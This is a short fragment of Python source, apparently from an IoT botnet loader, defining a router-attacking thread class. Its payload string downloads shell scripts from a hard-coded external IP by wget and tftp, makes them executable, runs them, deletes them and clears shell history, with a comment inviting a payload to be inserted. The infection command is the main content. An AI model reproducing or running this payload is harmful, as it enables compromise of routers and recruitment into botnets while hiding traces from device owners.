...
class router(threading.Thread):
    def __init__ (self, ip):
        ...
        self.rekdevice="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.147.209.165/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 212.147.209.165 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #<---Payload Goes In Between The ---> "" 
    def run(self):
        global fh
        username = ""
        password = ""
